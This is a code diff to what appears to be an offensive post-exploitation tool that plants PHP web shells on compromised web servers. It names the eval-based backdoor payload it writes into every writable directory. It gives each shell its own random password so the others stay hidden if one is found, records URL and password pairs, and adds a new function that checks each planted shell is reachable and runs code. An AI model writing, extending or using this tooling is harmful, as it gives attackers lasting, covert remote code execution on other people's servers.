@@ -46,17 +46,34 @@ def _write_remote(ws: WebShell, server_path: str, content: str) -> bool:
     return "OK" in ws.run_php(code)
 
 
+def verify_injected(ws: WebShell, url: str, password: str) -> bool:
+    """Confirm a freshly dropped shell is reachable *and* executes our code.
+
+    Reuses the same liveness check as the initial connect, against the new URL
+    (with the same transport settings: proxy/TLS/UA).
+    """
+    probe = WebShell(url, "POST", password, ws.transport.config)
+    ok = probe.connect()
+    if ok:
+        log.success(f"Verified reachable: {url}")
+    else:
+        log.warning(f"Injected but unverified ({probe.reason}): {url}")
+    return ok
+
+
 def inject_webshell(
     ws: WebShell,
     password: str | None = None,
     writable_dirs: list[str] | None = None,
     *,
     output_dir: Path,
+    verify: bool = False,
 ) -> list[tuple[str, str]]:
     """Drop ``<?php @eval($_REQUEST[password]) ?>`` into each writable dir.
 
     When ``password`` is ``None`` a fresh random password is generated *per
     directory*, so discovering one dropped shell does not expose the others.
+    With ``verify=True`` each dropped shell is probed for reachability.
     Returns ``(url, password)`` pairs.
     """
     fake = "<?php print_r('It works');?>"
@@ -72,6 +89,8 @@ def inject_webshell(
             results.append((url, pw))
             _record(output_dir, f"{url} => {pw}")
             log.success(f"Injected: {url} (password={pw})")
+            if verify:
+                verify_injected(ws, url, pw)
         else:
             log.error(f"Write failed in {directory}")
     return results
